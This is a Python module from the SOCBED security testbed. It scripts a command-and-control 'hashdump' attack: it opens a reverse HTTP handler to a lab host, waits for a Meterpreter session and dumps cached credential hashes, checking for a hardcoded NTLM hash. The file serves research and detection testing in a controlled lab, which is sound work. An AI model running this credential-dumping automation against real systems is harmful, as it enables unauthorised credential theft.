# Copyright 2016-2022 Fraunhofer FKIE
#
# This file is part of SOCBED.
#
# SOCBED is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# SOCBED is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with SOCBED. If not, see <http://www.gnu.org/licenses/>.


import time

from attacks import Attack, AttackInfo, AttackOptions
from attacks.reverseconnectionhandler import ReverseConnectionHandler


class HashdumpAttackOptions(AttackOptions):
    lhost = "Reverse HTTP target host or IP address"
    lport = "Reverse HTTP target port"

    def _set_defaults(self):
        self.lhost = "172.18.0.3"
        self.lport = "80"


class HashdumpAttack(Attack):
    info = AttackInfo(
        name="c2_hashdump",
        description="Obtains cached credentials using hashdump")
    options_class = HashdumpAttackOptions
    handler = None

    def run(self):
        with self.check_printed("breach:1000:"
                                "aad3b435b51404eeaad3b435b51404ee:"
                                "2aca7635afdc3febc408bee6b89acf16:::"):
            with self.wrap_ssh_exceptions():
                self._start_handler()
                self._handle_output()

    def _start_handler(self):
        self.handler = ReverseConnectionHandler(self.ssh_client, self.options.lhost, self.options.lport)
        self.handler.start()

    def _handle_output(self):
        try:
            for line in self.handler.stdout:
                self._respond(line)
                self.print(line.strip("\n"))
        except UnicodeDecodeError as e:
            self.print("UnicodeDecodeError: {}".format(e))
            self.handler.shutdown()

    def _respond(self, line):
        if ("Meterpreter session 1 opened" in line) or \
                ("Starting interaction with 1" in line):
            time.sleep(2)
            self._run_hashdump()
        elif ("Backgrounding session " in line) or \
                ("Exploit completed, but no session was created" in line):
            self.handler.shutdown()

    def _return_to_session(self):
        self.ssh_client.write_lines(self.handler.stdin, [
            "sessions -i 1"])

    def _run_hashdump(self):
        self.ssh_client.write_lines(self.handler.stdin, [
            "hashdump",
            "background"])
